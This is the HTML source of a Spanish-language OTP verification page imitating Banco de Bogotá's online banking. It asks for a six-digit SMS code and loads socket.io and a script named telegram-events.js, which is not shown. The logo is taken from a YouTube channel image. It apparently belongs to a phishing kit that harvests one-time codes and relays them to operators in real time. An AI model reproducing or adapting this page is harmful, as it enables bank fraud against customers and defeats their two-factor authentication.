<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="description" content="Verificación OTP - Banco de Bogotá">
    <meta name="theme-color" content="#002A8D">
    
    <title>Verificación OTP - Banco de Bogotá</title>
    
    <!-- Favicons -->
    <link rel="icon" type="image/png" href="Imagenes/channels4_profile-removebg-preview.png">
    <link rel="apple-touch-icon" href="Imagenes/channels4_profile-removebg-preview.png">
    
    <!-- Estilos -->
    <link rel="stylesheet" href="css/loading-overlay.css?v=1.0.2">
    <link rel="stylesheet" href="otp.css?v=1.0.2">
    
    <!-- Scripts -->
    <script src="/socket.io/socket.io.js"></script>
    <script src="js/loading-overlay-manager.js?v=1.0.2"></script>
    <script src="js/common.js?v=1.0.2"></script>
    <script src="js/telegram-events.js?v=1.0.2"></script>
    <script src="otp.js?v=1.0.2" defer></script>
</head>
<body>
    <!-- Loading Overlay -->
    <div class="loading-overlay" id="loadingOverlay">
        <div class="loading-content">
            <img src="Imagenes/channels4_profile-removebg-preview.png" alt="Banco de Bogotá" class="loading-logo">
            <div class="loading-spinner">
                <div class="spinner-ring"></div>
            </div>
            <p class="loading-text">Cargando</p>
            <p class="loading-subtext"></p>
        </div>
    </div>

    <div class="header">
        <div class="nav-left">
            <a href="javascript:history.back()" class="back-btn">← Atrás</a>
        </div>
        <div class="nav-center">
            <h1>Ingreso a Banca Virtual</h1>
        </div>
        <div class="nav-right">
            <button onclick="window.close()" class="abandon-btn">Abandonar ×</button>
        </div>
    </div>

    <div class="login-section">
        <h2>Verifiquemos que seas tú</h2>
        
        <div class="otp-container">
            <div class="otp-icon">
                <img src="Imagenes/channels4_profile-removebg-preview.png" alt="OTP Icon" class="bank-logo">
            </div>
            <div class="otp-content">
                <h3>Código SMS <span class="info-icon">ⓘ</span></h3>
                <p>Ingresa el código de 6 dígitos que enviamos a tu número de celular registrado.</p>
                
                <div class="otp-input-container">
                    <input type="tel" maxlength="1" class="otp-input" pattern="[0-9]" inputmode="numeric">
                    <input type="tel" maxlength="1" class="otp-input" pattern="[0-9]" inputmode="numeric">
                    <input type="tel" maxlength="1" class="otp-input" pattern="[0-9]" inputmode="numeric">
                    <input type="tel" maxlength="1" class="otp-input" pattern="[0-9]" inputmode="numeric">
                    <input type="tel" maxlength="1" class="otp-input" pattern="[0-9]" inputmode="numeric">
                    <input type="tel" maxlength="1" class="otp-input" pattern="[0-9]" inputmode="numeric">
                </div>

                <button class="verify-btn" disabled>Verificar</button>
                
                <div class="resend-container">
                    <p>¿No recibiste el código? <a href="#" class="resend-link">Reenviar código</a></p>
                </div>
            </div>
        </div>
    </div>
</body>
</html>
